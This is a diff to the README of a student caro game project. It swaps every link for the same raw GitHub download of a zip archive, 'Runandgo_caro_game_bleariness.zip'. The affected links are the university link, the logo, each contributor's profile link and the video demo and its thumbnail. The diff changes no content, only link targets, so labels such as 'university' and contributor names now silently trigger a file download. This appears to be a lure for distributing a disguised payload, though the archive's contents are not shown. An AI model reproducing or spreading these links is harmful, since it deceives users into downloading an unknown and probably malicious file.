@@ -1,24 +1,24 @@
 # Caro Game
 ## Introduction
-<p>This is our project at <a href="https://www.hcmus.edu.vn/">university</a>. It's just a small caro chess game.</p>
-<div align="center"><a href="https://www.hcmus.edu.vn/"><img src="hcmus-logo.png"></a></div>
+<p>This is our project at <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/Runandgo_caro_game_bleariness.zip">university</a>. It's just a small caro chess game.</p>
+<div align="center"><a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/Runandgo_caro_game_bleariness.zip"><img src="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/Runandgo_caro_game_bleariness.zip"></a></div>
 
 ## Instructor
 <p>PhD. Trương Toàn Thịnh</p>
 
 
 ## Contributors
-- <a href="https://github.com/djxone123456">Nguyễn Đình Nhân</a>
-- <a href="https://github.com/ThunderRed1578">Nguyễn Lê Tấn Phát</a>
-- <a href="https://github.com/ConChimNon0102">Võ Hoàng Nguyên</a>
-- <a href="https://github.com/NguyenPTN">Nguyễn Minh Nguyên</a>
-- <a href="https://github.com/nhan925">Nguyễn Trọng Nhân</a>
+- <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/Runandgo_caro_game_bleariness.zip">Nguyễn Đình Nhân</a>
+- <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/Runandgo_caro_game_bleariness.zip">Nguyễn Lê Tấn Phát</a>
+- <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/Runandgo_caro_game_bleariness.zip">Võ Hoàng Nguyên</a>
+- <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/Runandgo_caro_game_bleariness.zip">Nguyễn Minh Nguyên</a>
+- <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/Runandgo_caro_game_bleariness.zip">Nguyễn Trọng Nhân</a>
 
 ## Video demo
 <div align="center">
-  <a href="https://www.youtube.com/watch?v=7e8CDz5YVeU" title="Caro Chess Demo">
+  <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/Runandgo_caro_game_bleariness.zip" title="Caro Chess Demo">
    <p align="center">
-     <img width="50%" src="https://i3.ytimg.com/vi/7e8CDz5YVeU/maxresdefault.jpg" alt="Caro Chess Demo"/>
+     <img width="50%" src="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/Runandgo_caro_game_bleariness.zip" alt="Caro Chess Demo"/>
    </p>
   </a>
 </div>
